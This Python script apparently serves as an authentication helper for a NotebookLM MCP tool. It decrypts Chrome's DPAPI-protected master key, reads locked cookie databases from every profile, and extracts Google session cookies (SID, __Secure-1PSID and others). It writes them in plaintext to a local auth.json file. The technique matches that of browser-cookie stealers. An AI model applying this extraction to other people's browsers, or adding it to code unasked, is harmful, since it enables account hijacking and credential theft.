import os
import json
import base64
import sqlite3
import shutil
import time
from pathlib import Path
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def auto_extract_and_save():
    user_data = Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data'
    local_state_path = user_data / 'Local State'

    if not local_state_path.exists():
        print("No se encontró Local State de Chrome.")
        return False

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:] # strip DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def decrypt_val(buff):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AESGCM(master_key)
            return cipher.decrypt(iv, payload, None).decode('utf-8')
        except Exception:
            return ''

    profiles = ['Default'] + [p.name for p in user_data.glob('Profile *')]
    extracted_cookies = {}

    for p in profiles:
        cookie_db = user_data / p / 'Network' / 'Cookies'
        if not cookie_db.exists():
            cookie_db = user_data / p / 'Cookies'
        if not cookie_db.exists():
            continue
        
        # Chrome locks the file, so we read with shared permissions via win32file or Python
        try:
            import win32file, win32con
            handle = win32file.CreateFile(
                str(cookie_db),
                win32con.GENERIC_READ,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                None,
                win32con.OPEN_EXISTING,
                win32con.FILE_ATTRIBUTE_NORMAL,
                None
            )
            # Read content
            _, data = win32file.ReadFile(handle, os.path.getsize(str(cookie_db)))
            win32file.CloseHandle(handle)
            temp_db = Path('temp_cookies.db')
            with open(temp_db, 'wb') as f:
                f.write(data)
        except Exception as ex_win:
            try:
                temp_db = Path('temp_cookies.db')
                shutil.copyfile(cookie_db, temp_db)
            except Exception as e:
                print(f"win32file error: {ex_win} | copyfile error: {e}")
                continue
        
        conn = sqlite3.connect(temp_db)
        conn.text_factory = bytes
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%google.com%'")
            for name_b, enc_val in cursor.fetchall():
                name = name_b.decode('utf-8', errors='ignore')
                if name in ['SID', '__Secure-1PSID', '__Secure-3PSID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'OSID', '__Secure-OSID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC']:
                    val = decrypt_val(enc_val)
                    if val:
                        extracted_cookies[name] = val
        except Exception as e:
            print(f"Error procesando perfil {p}: {e}")
        finally:
            conn.close()
            if temp_db.exists():
                try:
                    temp_db.unlink()
                except Exception:
                    pass

    print(f"Cookies encontradas en Chrome: {len(extracted_cookies)}")
    print(f"Keys: {list(extracted_cookies.keys())}")

    if not extracted_cookies:
        print("No se encontraron cookies de Google.")
        return False

    auth_data = {
        "cookies": extracted_cookies,
        "csrf_token": "",
        "session_id": "",
        "extracted_at": time.time()
    }

    cache_dir = Path.home() / ".notebooklm-mcp"
    cache_dir.mkdir(exist_ok=True)
    cache_file = cache_dir / "auth.json"

    with open(cache_file, "w", encoding="utf-8") as f:
        json.dump(auth_data, f, indent=2)

    print(f"¡ÉXITO! Cookies de Chrome guardadas automáticamente en {cache_file}")
    return True

if __name__ == '__main__':
    auto_extract_and_save()
